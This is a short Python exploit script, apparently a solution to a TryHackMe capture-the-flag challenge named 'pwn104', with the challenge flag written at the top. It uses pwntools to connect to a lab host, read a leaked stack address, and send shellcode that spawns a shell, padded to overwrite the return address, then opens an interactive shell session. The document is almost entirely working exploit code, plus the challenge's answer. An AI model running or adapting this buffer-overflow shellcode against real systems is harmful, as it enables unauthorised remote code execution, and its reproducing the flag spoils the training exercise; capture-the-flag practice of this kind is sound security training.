#THM{0h_n0o0o0o_h0w_Y0u_Won??}
from pwn import *

host  = '10.10.176.67' 
port = 9004
elf = ELF('./pwn104-1644300377109.pwn104')
context.binary = elf

# p = process('./pwn104-1644300377109.pwn104')

p = remote(host, port)
p.recvuntil(b"waiting for you at ")
buf = p.recvline().strip()
addr = int(buf , 16)


sc = asm(shellcraft.sh())
padding = b'A' * (88 - len(sc))

payload = flat([
    sc,
    padding,
    addr
])

p.sendline(payload)

p.interactive()